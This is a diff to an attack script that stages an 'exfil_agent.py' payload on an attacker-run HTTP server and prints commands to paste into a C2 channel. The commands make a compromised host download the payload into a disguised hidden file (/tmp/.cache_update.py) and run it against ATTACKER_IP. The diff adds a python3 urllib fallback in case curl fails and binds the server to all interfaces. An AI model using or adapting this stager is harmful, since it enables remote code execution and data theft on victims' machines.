@@ -16,9 +16,9 @@ if [ ! -f "$AGENT_FILE" ]; then
     exit 1
 fi
 
-echo "[*] Starting HTTP server on port ${HTTP_PORT}..."
+echo "[*] Starting HTTP server on 0.0.0.0:${HTTP_PORT}..."
 cd "$SCRIPT_DIR"
-python3 -m http.server "$HTTP_PORT" --bind "$ATTACKER_IP" &>/dev/null &
+python3 -m http.server "$HTTP_PORT" --bind 0.0.0.0 &>/dev/null &
 HTTP_PID=$!
 sleep 0.5
 
@@ -27,11 +27,18 @@ if ! kill -0 "$HTTP_PID" 2>/dev/null; then
     exit 1
 fi
 
+URL="http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py"
+DEST="/tmp/.cache_update.py"
+
 echo "[+] HTTP server running (PID: ${HTTP_PID})"
 echo ""
-echo "[*] Paste this ONE command into C2:"
+echo "[*] Paste ONE of these into C2:"
 echo ""
-echo "curl -sS http://${ATTACKER_IP}:${HTTP_PORT}/exfil_agent.py -o /tmp/.cache_update.py && python3 /tmp/.cache_update.py ${ATTACKER_IP}"
+echo "  curl:"
+echo "curl -sS ${URL} -o ${DEST} && python3 ${DEST} ${ATTACKER_IP}"
+echo ""
+echo "  python3 (if curl fails):"
+echo "python3 -c \"import urllib.request;urllib.request.urlretrieve('${URL}','${DEST}')\" && python3 ${DEST} ${ATTACKER_IP}"
 echo ""
 echo "[*] Press Enter after agent connects to stop HTTP server..."
 read -r
